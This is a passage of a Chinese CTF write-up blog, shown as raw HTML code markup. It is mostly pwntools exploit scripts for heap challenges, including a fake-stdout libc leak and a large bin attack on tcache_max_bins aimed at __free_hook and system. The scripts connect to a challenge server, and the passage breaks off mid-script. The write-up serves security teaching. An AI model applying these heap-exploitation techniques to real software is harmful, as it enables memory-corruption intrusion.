punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    fake_io <span class=\"token operator\">=</span>  <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\"</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n    leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> leak <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n\n    _IO_2_1_stdout_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span>\n    environ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">,</span>_IO_2_1_stdout_<span class=\"token punctuation\">)</span>\n    io_chunk <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span> <span class=\"token number\">0x43</span>\n    \n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xf0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x160</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf8</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span> <span class=\"token punctuation\">,</span> io_chunk <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n\n    fake_io <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>environ <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">,</span> environ <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io <span class=\"token punctuation\">)</span>\n    stack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">,</span>stack_addr<span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    eadd<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xbf0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xbf0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x98</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>io_chunk<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">)</span>\n    flag_addr <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x188</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'flag_addr'</span><span class=\"token punctuation\">,</span>flag_addr<span class=\"token punctuation\">)</span>\n    fake_io <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span>flag_addr <span class=\"token punctuation\">,</span>flag_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n    \n\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># attack()</span>\nexhaust<span class=\"token punctuation\">(</span>attack<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   lemon_pwn.py\n@Time    :   2021/08/21 11:59:54\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"passwordbox_proversion\"><a class=\"markdownIt-Anchor\" href=\"#passwordbox_proversion\">#</a> PassWordBox_ProVersion</h1>\n<p>接下来就是我没有做出来的题了，说实话这题准备用 ha1vk 师傅的 house of banana 方法做的，但是就是差那么一点点</p>\n<p>这题的洞比前面那题还简单，纯纯的 uaf，但是只能申请 large bin 范围里边的堆块，这时候就需要考虑 large bin attack 了，large bin attack 可以向一个地址写一个很大的值，官方解法是向 tcache_max_bins 写一个很大的值，让不属于 tcache 的比较大的堆块也属于 tcache  ，有了 tcache 后就随便打了</p>\n<blockquote>\n<p>tcache_max_bins 储存了 tcache 的种类数量，一个我不知道的知识点，还是太菜了</p>\n</blockquote>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwdPro'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.71.220'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'38562'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which PwdBox You Want Add:'</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input The ID You Want Save:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Length Of Your Pwd:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your Pwd:'</span><span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Delete:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Want Check:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which PwdBox You Want Edit:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">recovery</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Recover:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> key\n    rst <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        rst <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> u64 <span class=\"token punctuation\">(</span> payload<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rst\n\n<span class=\"token comment\"># 总结 如果知道 large bin attack 后续操作那将会是非常简单的一道题</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x528</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Save ID:'</span><span class=\"token punctuation\">)</span>\nkey <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x518</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrecovery<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg()</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\nleak <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \n\n__malloc_hook <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nglobal_max_fast <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x2fa0</span>\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\ntcache_max_bins <span class=\"token operator\">=</span> <span class=\"token number\">0x1eb2d0</span> <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>address\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'tcache_max_bins'</span><span 